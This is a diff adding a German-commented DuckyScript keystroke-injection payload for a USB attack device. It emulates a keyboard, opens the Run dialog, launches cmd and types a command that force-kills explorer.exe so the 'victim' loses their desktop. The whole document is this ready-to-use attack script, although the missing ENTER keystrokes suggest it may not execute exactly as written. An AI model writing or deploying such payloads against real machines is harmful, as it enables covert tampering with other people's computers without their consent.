@@ -1,0 +1,20 @@
+REM Payload 3
+REM In Payload 3 will ich per cmd den Explorer beenden, dafür brauchen wir
+REM keine erhöhten Rechte.
+REM Delay 3000 als kleine Wartezeit, um sicherzugehen, das alles funktioniert
+
+REM Zuerst ATTACKMODE wählen
+ATTACKMODE HID STORAGE
+
+REM Jetzt müssen mit dem RUN Menü CMD öffnen
+GUI r
+DELAY 3000
+STRING cmd
+DELAY 3000
+
+REM Jetzt fügen wir ein Befehl ein, der den Explorer schließt.
+REM Somit sieht das Opfer ihren Desktop nicht mehr, bis der Explorer
+REM wieder gestartet wird.
+STRING taskkill /f /IM explorer.exe
+
+REM Fertig!
